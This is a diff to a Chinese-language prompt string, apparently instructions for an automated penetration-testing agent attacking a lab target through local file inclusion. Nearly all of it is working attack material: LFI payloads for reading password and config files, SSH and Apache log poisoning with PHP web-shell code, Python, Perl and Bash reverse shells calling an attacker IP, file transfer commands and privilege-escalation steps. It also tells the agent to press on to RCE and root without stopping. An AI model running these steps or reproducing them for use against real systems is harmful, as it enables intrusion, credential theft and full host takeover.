@@ -347,95 +347,118 @@ LFI（本地文件包含）测试：
 发现PHP文件带参数时（如 ?file= ?page= ?image= ?path= ?include=）：
   ⚠️ 必须查看HTML源码确认参数名，不要猜测！
   curl "http://<target>/page.php?<参数名>=/etc/passwd"
-  curl "http://<target>/page.php?<参数名>=../../../../etc/passwd"
 
-如果能读取到passwd内容，LFI确认。立即进入步骤2-6。
-
-════════════════════════════════════════════════
-步骤2 - 用PHP filter读源码（base64编码）：
-════════════════════════════════════════════════
-  curl "http://<target>/page.php?<参数名>=php://filter/convert.base64-encode/resource=<文件>"
-  → 返回base64编码的PHP源码，用 base64 -d 解码
+如果能读取到passwd内容，LFI确认。检查phpinfo确认allow_url_include状态。
 
 ════════════════════════════════════════════════
-步骤3 - 读取敏感文件（按优先级）：
+步骤2 - 读取敏感文件（按优先级）：
 ════════════════════════════════════════════════
   /etc/passwd                          → 确认用户名
-  /etc/shadow                          → 密码哈希（需root权限，通常读不到）
   /etc/nginx/.htpasswd                 → nginx认证密码（常见目标！）
   /etc/nginx/sites-enabled/default     → nginx虚拟主机配置
-  /etc/nginx/nginx.conf                → nginx全局配置
   /var/www/html/config.php             → 数据库凭据
-  /var/www/html/wp-config.php          → WordPress数据库凭据
-  /proc/self/environ                   → 环境变量（可能包含路径）
+  /proc/self/environ                   → 环境变量
 
 ════════════════════════════════════════════════
-步骤4 - LFI→RCE方法（按优先级排序！）：
+步骤3 - LFI→RCE方法（按优先级排序！）：
 ════════════════════════════════════════════════
 ⚠️ 不要停留在文件读取，确认LFI后必须尝试RCE！
 
-方法A - SSH日志投毒（优先级最高！）：
+═══ 方法A - SSH日志投毒（最高优先级！）═══
   前提：目标开放SSH端口
-  步骤：
-  1) 注入PHP代码到SSH认证日志：
-     ssh '<?php system($_GET["cmd"]); ?>'@<target> -p <ssh_port>
-  2) 通过LFI包含日志文件执行命令：
-     curl "http://<target>/vuln.php?<参数名>=/var/log/auth.log&cmd=id"
-  3) 如果auth.log路径不对，尝试：
-     /var/log/auth.log
-     /var/log/secure
-     /var/log/syslog
+  ⚠️ 重要：直接用ssh命令发送含特殊字符的用户名会失败！
+  "remote username contains invalid characters"错误表示SSH拒绝<>等字符
+  必须使用python paramiko库来投毒！
 
-方法B - PHP Session Upload Progress竞态条件（非常可靠！）：
-  前提：PHP session.auto_start=On 或可设置PHPSESSID cookie
-  步骤（使用python脚本最可靠）：
-  1) 同时发送两个请求：
-     - 线程1：POST上传文件，设置PHP_SESSION_UPLOAD_PROGRESS为PHP代码
-     - 线程2：包含/var/lib/php/sessions/sess_<session_id>
-  2) 竞态条件：在session文件被清理前包含它
-  3) 经验：cookie设置为PHPSESSID=rce_payload，session文件路径为
-     /var/lib/php/sessions/sess_rce_payload
+  步骤1 - 用paramiko注入PHP代码到SSH认证日志：
+    python_execute:
+    ```python
+    import paramiko
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        ssh.connect('<target>', port=2211, username='<?php system($_GET["cmd"]); ?>', password='test', timeout=5)
+    except:
+        pass
+    ```
 
-方法C - Apache/Nginx日志包含：
-  前提：日志文件可读
-  步骤：
-  1) Apache：向日志注入PHP代码
-     curl -H "User-Agent: <?php system($_GET['cmd']); ?>" "http://<target>/"
-     或用python发送包含PHP代码的原始HTTP请求
-  2) 包含日志文件：
-     curl "http://<target>/vuln.php?<参数名>=/var/log/apache2/access.log&cmd=id"
-     curl "http://<target>/vuln.php?<参数名>=/var/log/apache2/error.log&cmd=id"
-     curl "http://<target>/vuln.php?<参数名>=/var/log/nginx/access.log&cmd=id"
+  步骤2 - 通过LFI包含日志文件执行命令：
+    curl "http://<target>/vuln.php?<参数名>=/var/log/auth.log&cmd=id"
 
-方法D - /proc/self/environ包含：
-  前提：User-Agent可控且environ可读
+  步骤3 - 如果命令输出被phpinfo页面污染，用grep提取：
+    curl "http://<target>/vuln.php?<参数名>=/var/log/auth.log&cmd=id" | grep "uid="
+    或用python脚本提取关键行
+
+  备选日志路径：/var/log/auth.log, /var/log/secure, /var/log/syslog
+
+═══ 方法B - PHP Session Upload Progress竞态条件 ═══
+  前提：PHP session可用
+  使用python脚本同时发送上传请求和包含请求（竞态条件）
+  session文件路径：/var/lib/php/sessions/sess_<PHPSESSID值>
+
+═══ 方法C - Apache日志包含 ═══
+  curl -H "User-Agent: <?php system($_GET['cmd']); ?>" "http://<target>/"
+  curl "http://<target>/vuln.php?<参数名>=/var/log/apache2/access.log&cmd=id"
+  ⚠️ 注意：Apache日志可能不解析PHP代码（被HTML编码），优先尝试方法A
+
+═══ 方法D - /proc/self/environ包含 ═══
   curl -H "User-Agent: <?php system($_GET['cmd']); ?>" "http://<target>/vuln.php?<参数名>=/proc/self/environ&cmd=id"
+  ⚠️ 此方法在很多系统上不work
 
 ⚠️ 注意：php://input和data://可能被php.ini禁用（allow_url_include=Off），优先使用以上方法
 
 ════════════════════════════════════════════════
-步骤5 - 获取RCE后执行命令和反弹Shell：
+步骤4 - 获取RCE后反弹Shell（在攻击机先开监听 nc -lvnp 4444）：
 ════════════════════════════════════════════════
-确认RCE后（如uid=33(www-data)），立即尝试：
+确认RCE后（如uid=33(www-data)），立即尝试反弹Shell：
 
-反弹Shell（在攻击机先开监听 nc -lvnp 4444）：
-  方法1 - Python反弹Shell（最稳定）：
+方法1 - Python反弹Shell（最稳定，推荐）：
   &cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
 
-  方法2 - Bash反弹Shell：
+方法2 - Perl反弹Shell（python不可用时）：
+  &cmd=perl+-e+'use+Socket;$i="<attacker_ip>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,pack_sockaddr_in($p,inet_aton($i)));open(STDIN,">%26S");open(STDOUT,">%26S");open(STDERR,">%26S");exec("/bin/sh+-i");'
+
+方法3 - Bash反弹Shell：
   &cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<attacker_ip>/4444+0>%261'
 
-⚠️ 如果LFI返回的内容被phpinfo页面污染（大量CSS/HTML），提取命令输出：
-  用python脚本执行竞态条件，将命令输出重定向到临时文件，再用LFI读取临时文件
+⚠️ 如果目标靶机nc没有-e参数，必须使用python/perl反弹Shell
+⚠️ 如果LFI返回的内容被phpinfo页面污染，用grep提取命令输出或python脚本处理
+
+════════════════════════════════════════════════
+步骤5 - 权限提升（获取www-data后）：
+════════════════════════════════════════════════
+获取初始Shell后，立即尝试提权到root：
+
+1) 信息收集：
+   whoami; id; uname -a; cat /etc/os-release
+   sudo -l; find / -perm -4000 2>/dev/null; find / -writable -type f 2>/dev/null
+
+2) 内核漏洞检测：
+   上传 linux-exploit-suggester.sh 到靶机并执行
+   ⚠️ 如果靶机没有gcc编译环境，在攻击机上交叉编译exploit后再上传
+   指定旧版glibc编译：gcc -o exp exp.c -Wl,--rpath=/path/to/old/glibc
+
+3) 常见提权方法：
+   - 内核漏洞（CVE-2017-6074等）
+   - SUID二进制（find / -perm -4000）
+   - sudo配置错误
+   - 定时任务（cat /etc/crontab）
+   - 可写脚本（find / -writable -type f）
+
+4) 传输文件方法：
+   攻击机：nc -lvnp 4444 > /tmp/exploit （接收）
+   靶机：nc <attacker_ip> 4444 < /tmp/exploit （发送）
+   或：python3 -m http.server 然后在靶机 wget http://<attacker_ip>:8000/exploit
 
 ════════════════════════════════════════════════
 绝对禁止：
 ════════════════════════════════════════════════
 ❌ 发现LFI后不要停留在探测阶段 — 立即读取敏感文件并尝试RCE
-❌ 不要只测试不同参数名（?file= ?page=）— 查看HTML源码确认参数名
-❌ 如果php://filter返回空，说明路径可能不对，变换路径格式再试
-❌ 不要在哈希破解上耗费时间 — LFI→RCE可以直接获取Shell，不需要密码
-❌ 不要只尝试一种RCE方法 — 如果方法A不成功，立即尝试方法B/C/D
+❌ 不要只测试不同参数名 — 查看HTML源码确认参数名
+❌ SSH日志投毒不要用ssh命令 — 用paramiko库（ssh命令拒绝特殊字符）
+❌ 不要在哈希破解上耗费时间 — LFI→RCE可以直接获取Shell
+❌ 如果方法A不成功，立即尝试方法B/C/D
+❌ 获取Shell后不要忘记提权 — www-data不是root
 """,
         "return_format": {
             "type": "json",
